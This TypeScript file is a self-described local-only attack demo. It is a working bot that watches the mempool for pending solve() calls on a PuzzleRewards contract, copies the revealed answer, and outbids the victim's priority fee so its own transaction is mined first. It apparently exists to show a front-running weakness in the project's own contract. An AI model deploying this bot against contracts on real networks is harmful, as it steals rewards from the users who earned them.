// ATTACK DEMO: a front-running bot against PuzzleRewards. Local anvil only.
//
// It watches the mempool for anyone calling solve(puzzleId, answer), reads the answer
// straight out of the pending transaction, and submits the same answer with a higher
// tip so a block builder puts its copy first.
//
// Run anvil with a block time so transactions actually wait in the mempool:
//   anvil --block-time 5
// then deploy, start the UI, and in another terminal (in apps/web/):
//   npm run attack:copycat
import { readFileSync } from 'node:fs';
import {
  createPublicClient,
  createWalletClient,
  decodeFunctionData,
  formatUnits,
  http,
  parseAbi,
  type Hash,
} from 'viem';
import { mnemonicToAccount } from 'viem/accounts';
import { foundry } from 'viem/chains';

const ANVIL_MNEMONIC = 'test test test test test test test test test test test junk';
const deployment = JSON.parse(readFileSync(new URL('../../../contracts/deployments/31337.json', import.meta.url), 'utf8'));
const PUZZLES = deployment.PuzzleRewards as `0x${string}`;
const TOKEN = deployment.DavaoCoin as `0x${string}`;

const abi = parseAbi([
  'function solve(uint256 puzzleId, string answer)',
  'function hasSolved(uint256 puzzleId, address solver) view returns (bool)',
  'function balanceOf(address) view returns (uint256)',
]);

const transport = http('http://127.0.0.1:8545');
const bot = mnemonicToAccount(ANVIL_MNEMONIC, { addressIndex: 7 });
const publicClient = createPublicClient({ chain: foundry, transport, pollingInterval: 250 });
const walletClient = createWalletClient({ account: bot, chain: foundry, transport });

const seen = new Set<Hash>();
const short = (a: string) => `${a.slice(0, 6)}…${a.slice(-4)}`;

async function report(victimHash: Hash, botHash: Hash) {
  const [victim, mine] = await Promise.all([
    publicClient.waitForTransactionReceipt({ hash: victimHash }),
    publicClient.waitForTransactionReceipt({ hash: botHash }),
  ]);
  const balance = await publicClient.readContract({
    address: TOKEN,
    abi,
    functionName: 'balanceOf',
    args: [bot.address],
  });
  const order = (r: typeof victim) => `block ${r.blockNumber}, position ${r.transactionIndex}`;
  console.log(`  victim tx: ${order(victim)} (${victim.status})`);
  console.log(`  bot tx:    ${order(mine)} (${mine.status})`);
  if (mine.blockNumber === victim.blockNumber && mine.transactionIndex < victim.transactionIndex) {
    console.log('  >> Front-run: the bot was mined AHEAD of the person who actually solved it.');
  }
  console.log(`  bot now holds ${formatUnits(balance, 18)} DURIAN\n`);
}

console.log(`Copycat bot ${short(bot.address)} watching the mempool for solve() calls on ${short(PUZZLES)}…\n`);

publicClient.watchPendingTransactions({
  onError: (e) => console.error('watch error:', e.message),
  onTransactions: async (hashes) => {
    for (const hash of hashes) {
      if (seen.has(hash)) continue;
      seen.add(hash);

      const tx = await publicClient.getTransaction({ hash }).catch(() => null);
      if (!tx || tx.to?.toLowerCase() !== PUZZLES.toLowerCase()) continue;
      if (tx.from.toLowerCase() === bot.address.toLowerCase()) continue;

      let decoded;
      try {
        decoded = decodeFunctionData({ abi, data: tx.input });
      } catch {
        continue;
      }
      if (decoded.functionName !== 'solve') continue;

      const [puzzleId, answer] = decoded.args;
      console.log(`Saw ${short(tx.from)} solving puzzle ${puzzleId + 1n} with answer "${answer}" (still pending)`);

      const already = await publicClient.readContract({
        address: PUZZLES,
        abi,
        functionName: 'hasSolved',
        args: [puzzleId, bot.address],
      });
      if (already) {
        console.log('  bot already claimed this one, skipping\n');
        continue;
      }

      // Outbid the victim's tip so the block builder orders our copy first.
      const victimTip = tx.maxPriorityFeePerGas ?? 1_000_000_000n;
      const tip = victimTip * 10n + 1_000_000_000n;
      const botHash = await walletClient.writeContract({
        address: PUZZLES,
        abi,
        functionName: 'solve',
        args: [puzzleId, answer],
        maxPriorityFeePerGas: tip,
        maxFeePerGas: (tx.maxFeePerGas ?? 0n) + tip * 2n,
        gas: 200_000n,
      });
      console.log(`  copied it with a ${formatUnits(tip, 9)} gwei tip (victim paid ${formatUnits(victimTip, 9)} gwei)`);
      void report(hash, botHash);
    }
  },
});
